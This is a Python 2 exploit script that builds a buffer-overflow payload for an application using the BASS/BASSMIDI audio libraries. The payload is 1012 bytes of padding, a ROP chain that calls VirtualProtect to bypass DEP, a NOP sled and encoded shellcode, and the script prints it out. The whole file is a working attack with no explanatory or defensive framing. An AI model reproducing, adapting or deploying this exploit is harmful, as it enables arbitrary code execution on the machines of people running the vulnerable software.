#!/usr/bin/python2

import struct

shellcode = (
    "\xd9\xcb\xbe\xb9\x23\x67\x31\xd9\x74\x24\xf4\x5a\x29\xc9"
    "\xb1\x13\x31\x72\x19\x83\xc2\x04\x03\x72\x15\x5b\xd6\x56"
    "\xe3\xc9\x71\xfa\x62\x81\xe2\x75\x82\x0b\xb3\xe1\xc0\xd9"
    "\x0b\x61\xa0\x11\xe7\x03\x41\x84\x7c\xdb\xd2\xa8\x9a\x97"
    "\xba\x68\x10\xfb\x5b\xe8\xad\x70\x7b\x28\xb3\x86\x08\x64"
    "\xac\x52\x0e\x8d\xdd\x2d\x3c\x3c\xa0\xfc\xbc\x82\x23\xa8"
    "\xd7\x94\x6e\x23\xd9\xe3\x05\xd4\x05\xf2\x1b\xe9\x09\x5a"
    "\x1c\x39\xbd"
)

def create_rop_chain():
	rop_gadgets = [
		0x10015fe7,  # POP EAX # RETN [BASS.dll] 
		0x1060e25c,  # ptr to &VirtualProtect() [IAT BASSMIDI.dll
		0x1001eaf1,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [BASS.dll] 
		0x10030950,  # XCHG EAX,ESI # RETN [BASS.dll] 
		0x1001d748,  # POP EBP # RETN [BASS.dll] 
		0x100222c5,  # & jmp esp [BASS.dll]
		0x10015fe7,  # POP EAX # RETN [BASS.dll] 
		0xfffffdff,  # Value to negate, will become 0x00000201
		0x10014db4,  # NEG EAX # RETN [BASS.dll] 
		0x10032f32,  # XCHG EAX,EBX # RETN 0x00 [BASS.dll] 
		0x10015f77,  # POP EAX # RETN [BASS.dll] 
		0xffffffc0,  # Value to negate, will become 0x00000040
		0x10014db4,  # NEG EAX # RETN [BASS.dll] 
		0x10038a6d,  # XCHG EAX,EDX # RETN [BASS.dll] 
		0x100163c7,  # POP ECX # RETN [BASS.dll] 
		0x1060da06,  # &Writable location [BASSMIDI.dll]
		0x10603658,  # POP EDI # RETN [BASSMIDI.dll] 
		0x1001dc05,  # RETN (ROP NOP) [BASS.dll]
		0x10015fe7,  # POP EAX # RETN [BASS.dll] 
		0x90909090,  # nop
		0x1001d7a5,  # PUSHAD # RETN [BASS.dll] 
    ]

	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()
nops_sled = "\x90" * 16

payload = "A" * 1012
payload += rop_chain
payload += nops_sled
payload += shellcode 

print(payload)



